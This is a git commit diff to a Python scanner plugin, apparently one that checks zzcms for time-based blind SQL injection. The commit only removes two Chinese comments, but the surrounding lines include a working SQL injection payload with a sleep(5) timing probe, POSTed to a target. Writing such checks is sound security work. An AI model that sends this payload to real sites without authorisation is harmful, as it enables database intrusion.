1371f38fe8c7ada01d8e5822bcb1b94d06214a82
nopsad <40174225+nopsad@users.noreply.github.com>
2018-06-22 09:28:44 +0800

    Update xxx.py

--- xxx.py
+++ xxx.py
@@ -12,11 +12,10 @@ def scan_url(url):
     payload2 = "id=1&tablename=zzcms_answer where id=999999999 union select 1,2 and if(1=1,sleep(5),1)%23"
     start_time = time.time()
     code, head, body, errcode, redirect_url = curl.request(target, method='POST', data=payload1,headers={'Content-Type': 'application/x-www-form-urlencoded'})
-    #正常访问时间1
     end_time_1 = time.time()
  
     code, head, body, errcode, redirect_url = curl.request(target, method='POST', data=payload2 ,headers={'Content-Type': 'application/x-www-form-urlencoded'})
-       #延时访问时间
+      
     end_time_2 = time.time()
     time1 = end_time_1 - start_time
     time2 = end_time_2 - end_time_1
